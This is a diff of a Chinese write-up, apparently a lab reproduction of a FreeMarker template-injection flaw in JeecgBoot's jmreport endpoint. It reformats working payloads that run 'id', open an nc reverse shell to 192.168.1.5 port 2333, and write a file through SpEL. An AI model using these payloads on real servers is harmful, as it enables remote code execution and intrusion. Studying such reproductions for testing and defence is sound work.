@@ -65,7 +65,10 @@ services:
 
 #### 1. 执行 id 命令
 
-**payload:** `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
+**payload:** 
+```
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+```
 
 HTTP 请求体
 ```http
@@ -104,7 +107,11 @@ curl --location 'http://localhost:8080/jeecg-boot/jmreport/queryFieldBySql' \
 
 查看本机 IP：`192.168.1.5`
 
-**payload:** `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("nc 192.168.1.5 2333 -e /bin/bash")}`
+**payload:**
+
+```
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("nc 192.168.1.5 2333 -e /bin/bash")}
+```
 
 HTTP 请求体
 ```http
@@ -133,9 +140,17 @@ curl --location 'http://localhost:8080/jeecg-boot/jmreport/queryFieldBySql' \
 
 #### 1. 写文件
 
-**payload1:** `${"freemarker.template.utility.ObjectConstructor"?new()("org.springframework.expression.spel.standard.SpelExpressionParser").parseExpression("T(org.apache.commons.io.FileUtils).writeStringToFile(new java.io.File('/tmp/hello.txt'), 'hello freemarker ssti~\n')").getValue()}`
+**payload1:** 
 
-**payload2:** `<#assign ex=\"freemarker.template.utility.ObjectConstructor\"?new()>${ex(\"org.springframework.expression.spel.standard.SpelExpressionParser\").parseExpression(\"T(org.apache.commons.io.FileUtils).writeStringToFile(new java.io.File('/tmp/hello.txt'), 'hello freemarker ssti~\n')\").getValue()}`
+```
+${"freemarker.template.utility.ObjectConstructor"?new()("org.springframework.expression.spel.standard.SpelExpressionParser").parseExpression("T(org.apache.commons.io.FileUtils).writeStringToFile(new java.io.File('/tmp/hello.txt'), 'hello freemarker ssti~\n')").getValue()}
+```
+
+**payload2:** 
+
+```
+<#assign ex="freemarker.template.utility.ObjectConstructor"?new()>${ex("org.springframework.expression.spel.standard.SpelExpressionParser").parseExpression("T(org.apache.commons.io.FileUtils).writeStringToFile(new java.io.File('/tmp/hello.txt'), 'hello freemarker ssti~\n')").getValue()}
+```
 
 HTTP 请求体
 ```http
